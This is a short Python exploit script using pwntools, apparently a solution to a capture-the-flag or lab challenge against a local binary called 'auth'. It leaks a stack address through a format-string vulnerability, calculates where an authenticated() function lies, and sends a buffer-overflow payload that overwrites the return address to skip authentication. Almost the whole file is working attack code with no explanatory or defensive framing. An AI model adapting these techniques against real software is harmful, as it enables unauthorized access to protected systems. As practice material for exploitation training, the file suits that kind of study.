#!/usr/bin/python

from pwn import *
import re

offsetFromStack=0x555555556030-0x55555555519c
print('Offset from stack string to authenticated(): '+hex(offsetFromStack))

proc=process('./auth')

# Exploiting format string vuln to get 5 items on the stack
proc.sendline(b"%p %p %p %p %p")
procAnswer=proc.recvline()
print(procAnswer)
print()

# Get the stack address from the program's response
stackAddr=procAnswer.split(b' ')[7]
print('Address of stack string: '+str(stackAddr))
print()

# Calculate offset of authenticated from the address of string in stack
stackAddr=int(stackAddr, 0) - offsetFromStack

# Create payload
payload=b'A'*0x68
payload+=p64(stackAddr)
print('Payload to send: '+str(payload))
print()

# Send payload and receive process response
proc.sendline(payload)
print(proc.recvall())

proc.close()
